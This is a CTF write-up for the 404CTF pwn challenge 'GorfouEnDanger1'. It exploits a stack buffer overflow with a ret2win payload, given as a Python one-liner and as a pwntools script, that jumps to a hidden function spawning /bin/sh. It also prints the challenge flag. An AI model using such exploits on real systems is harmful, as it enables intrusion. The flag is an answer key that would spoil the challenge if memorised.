# GorfouEnDanger1

### Recon

We're doing the usual first steps here. It's good to know that the binary is 64-bit and little endian:

```
$ file chall 
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bc5d9d86ef7f729d68624930e7ed982127aa5c5f, for GNU/Linux 3.2.0, not stripped

$ checksec --file=chall
[*] 'GorfouEnDanger/gorfou-en-danger-1/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Fortunately here, we have access to the source code. There it is, stripped from all the unnecessary stuff:

```c
void debug_access(void) {
    puts("Accès à l'interface de debogage..."); 
    system("/bin/sh");
    return;
}

void take_command() {
    char command[0x100];
    
    printf("> ");
    read(0, command, 0x130);
    printf("Commande inconnue\n");
}

int main(void) {
    while (1) {
        take_command();
    }
    return 0;
}
```

At first glance, we see that the `take_command` function, called by `main`, contains a call to `read` in a buffer of size `0x130` (304 decimal), but the said buffer is only `0x100` bytes long (256 decimal). This is clearly a buffer overflow and we can exploit it.

Also, we note the presence of the `debug_access` function, called nowhere. This function calls a shell, therefore we will try to call it using the buffer overflow.

So, our exploit will consist in:
- some padding, to overwrite the return address on the stack;
- the address of the `debug_access` function.

### Exploit

To find the offset of the return address, we can create a cyclic pattern of size 300, using an [online tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?), because for some reason my `cyclic` tool didn't work right this time:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

Using `pwndbg` we can inspect the contents of registers, after the segmentation fault occured (due to the program trying to access an invalid address, because it was overwritten by our cyclic pattern):

```
RSP  0x7fffffffd888 ◂— 'Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9\n'
```

Looking up this pattern in our cyclic tool, we end up with the offset 264.
Next, let's get the address of our forbidden function:

```
pwndbg> info fun debug_access
0x00000000004004fd  debug_access
```

Remembering the target works in little-endian, we have to inject address bytes in reverse order. We can now craft our payload manually using Python:

```
$ python2 -c 'print "A"*264 + "\xfd\x04\x40\x00\x00\x00\x00\x00"' > payload
```

With our payload ready, we can finally exploit the binary:

```
cat payload | ./chall
```

A less manual approach would be to make a Python script using the Pwntools library (stripped from boilerplate code here for simplicity):

```
from pwn import *
io = start()
padding = 264

payload = flat(
    b'A' * padding,
    elf.functions.debug_access
)

io.sendlineafter(b'>', payload)

io.interactive()
```

We can run the exploit on the remote server to get our flag:

```
$ python exploit.py REMOTE challenges.404ctf.fr 32462
[O] Opening connection to challenges.404ctf.fr on port 32462: Trying 51.91.[+] Opening connection to challenges.404ctf.fr on port 32462: Done
[DEBUG] Received 0x3f1 bytes:
    00000000  20 20 20 20  20 20 5f 5f  20 20 20 20  20 20 20 20  │    │  __│    │    │
    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000040  20 20 20 20  20 20 20 20  20 20 20 20  20 0a 20 20  │    │    │    │ ·  │
    00000050  20 20 20 2f  5c 20 5c 20  20 20 20 20  20 20 20 20  │   /│\ \ │    │    │
    00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000090  20 20 20 20  20 20 20 20  20 0a 20 20  20 20 2f 20  │    │    │ ·  │  / │
    000000a0  20 5c 20 5c  20 20 20 20  20 20 2e 2d  2d 2d 2d 2d  │ \ \│    │  .-│----│
    000000b0  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  │----│----│----│----│
    *
    000000e0  2d 2d 2d 2e  20 0a 20 20  20 2f 20 2f  5c 20 5c 20  │---.│ ·  │ / /│\ \ │
    000000f0  5c 20 20 20  20 20 7c e2  96 91 e2 96  88 e2 96 80  │\   │  |·│····│····│
    00000100  e2 96 84 e2  96 91 e2 96  88 e2 96 80  e2 96 80 e2  │····│····│····│····│
    00000110  96 91 e2 96  88 e2 96 80  e2 96 80 e2  96 91 e2 96  │····│····│····│····│
    00000120  88 e2 96 80  e2 96 80 e2  96 91 e2 96  91 e2 96 91  │····│····│····│····│
    00000130  e2 96 88 e2  96 80 e2 96  80 e2 96 91  e2 96 88 e2  │····│····│····│····│
    00000140  96 80 e2 96  88 e2 96 91  e2 96 88 e2  96 80 e2 96  │····│····│····│····│
    00000150  88 e2 96 91  e2 96 88 e2  96 80 e2 96  80 e2 96 91  │····│····│····│····│
    00000160  e2 96 88 e2  96 80 e2 96  88 e2 96 91  e2 96 88 e2  │····│····│····│····│
    00000170  96 91 e2 96  91 e2 96 91  e2 96 88 e2  96 80 e2 96  │····│····│····│····│
    00000180  80 e2 96 91  e2 96 91 e2  96 91 e2 96  88 e2 96 91  │····│····│····│····│
    00000190  e2 96 88 e2  96 91 e2 96  80 e2 96 88  e2 96 91 7c  │····│····│····│···|│
    000001a0  0a 20 20 2f  20 2f 20 2f  5c 20 5c 20  5c 20 20 20  │·  /│ / /│\ \ │\   │
    000001b0  20 7c e2 96  91 e2 96 88  e2 96 91 e2  96 88 e2 96  │ |··│····│····│····│
    000001c0  91 e2 96 88  e2 96 91 e2  96 88 e2 96  91 e2 96 80  │····│····│····│····│
    000001d0  e2 96 80 e2  96 88 e2 96  91 e2 96 88  e2 96 91 e2  │····│····│····│····│
    000001e0  96 88 e2 96  91 e2 96 91  e2 96 91 e2  96 88 e2 96  │····│····│····│····│
    000001f0  91 e2 96 91  e2 96 91 e2  96 88 e2 96  91 e2 96 88  │····│····│····│····│
    00000200  e2 96 91 e2  96 88 e2 96  91 e2 96 88  e2 96 91 e2  │····│····│····│····│
    00000210  96 80 e2 96  80 e2 96 88  e2 96 91 e2  96 88 e2 96  │····│····│····│····│
    00000220  91 e2 96 88  e2 96 91 e2  96 88 e2 96  91 e2 96 91  │····│····│····│····│
    00000230  e2 96 91 e2  96 88 e2 96  80 e2 96 80  e2 96 91 e2  │····│····│····│····│
    00000240  96 91 e2 96  91 e2 96 80  e2 96 84 e2  96 80 e2 96  │····│····│····│····│
    00000250  91 e2 96 91  e2 96 88 e2  96 91 7c 0a  20 2f 20 2f  │····│····│··|·│ / /│
    00000260  20 2f 5f 5f  5c 5f 5c 20  5c 20 20 20  7c e2 96 91  │ /__│\_\ │\   │|···│
    00000270  e2 96 80 e2  96 80 e2 96  91 e2 96 91  e2 96 80 e2  │····│····│····│····│
    00000280  96 80 e2 96  80 e2 96 91  e2 96 80 e2  96 80 e2 96  │····│····│····│····│
    00000290  80 e2 96 91  e2 96 80 e2  96 80 e2 96  80 e2 96 91  │····│····│····│····│
    000002a0  e2 96 91 e2  96 91 e2 96  80 e2 96 80  e2 96 80 e2  │····│····│····│····│
    000002b0  96 91 e2 96  80 e2 96 80  e2 96 80 e2  96 91 e2 96  │····│····│····│····│
    000002c0  80 e2 96 91  e2 96 80 e2  96 91 e2 96  80 e2 96 80  │····│····│····│····│
    000002d0  e2 96 80 e2  96 91 e2 96  80 e2 96 80  e2 96 80 e2  │····│····│····│····│
    000002e0  96 91 e2 96  80 e2 96 80  e2 96 80 e2  96 91 e2 96  │····│····│····│····│
    000002f0  80 e2 96 80  e2 96 80 e2  96 91 e2 96  91 e2 96 91  │····│····│····│····│
    00000300  e2 96 91 e2  96 80 e2 96  91 e2 96 91  e2 96 80 e2  │····│····│····│····│
    00000310  96 80 e2 96  80 7c 0a 2f  20 2f 20 2f  5f 5f 5f 5f  │····│·|·/│ / /│____│
    00000320  5f 5f 5f 5f  5c 20 20 27  2d 2d 2d 2d  2d 2d 2d 2d  │____│\  '│----│----│
    00000330  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  │----│----│----│----│
    *
    00000360  27 20 20 0a  5c 2f 5f 5f  5f 5f 5f 5f  5f 5f 5f 5f  │'  ·│\/__│____│____│
    00000370  5f 2f 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │_/  │    │    │    │
    00000380  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000003b0  0a 54 65 72  6d 69 6e 61  6c 20 64 65  20 63 6f 6e  │·Ter│mina│l de│ con│
    000003c0  74 72 c3 b4  6c 65 20 c3  a0 20 64 69  73 74 61 6e  │tr··│le ·│· di│stan│
    000003d0  63 65 20 64  65 20 6c 61  20 62 61 73  65 20 6d 61  │ce d│e la│ bas│e ma│
    000003e0  72 74 69 65  6e 6e 65 20  46 65 72 6d  61 74 0a 3e  │rtie│nne │Ferm│at·>│
    000003f0  20                                                  │ │
    000003f1
[DEBUG] Sent 0x111 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000100  41 41 41 41  41 41 41 41  fd 04 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000110  0a                                                  │·│
    00000111
[*] Switching to interactive mode
 [DEBUG] Received 0x37 bytes:
    00000000  43 6f 6d 6d  61 6e 64 65  20 69 6e 63  6f 6e 6e 75  │Comm│ande│ inc│onnu│
    00000010  65 0a 41 63  63 c3 a8 73  20 c3 a0 20  6c 27 69 6e  │e·Ac│c··s│ ·· │l'in│
    00000020  74 65 72 66  61 63 65 20  64 65 20 64  65 62 6f 67  │terf│ace │de d│ebog│
    00000030  61 67 65 2e  2e 2e 0a                               │age.│..·│
    00000037
Commande inconnue
Accès à l'interface de debogage...
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x1f bytes:
    b'chall\n'
    b'flag.txt\n'
    b'lancement-fusee\n'
chall
flag.txt
lancement-fusee
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x1c bytes:
    b'404CTF{c@n_7He_GoRF0u_F1y_?}'
404CTF{c@n_7He_GoRF0u_F1y_?}
```
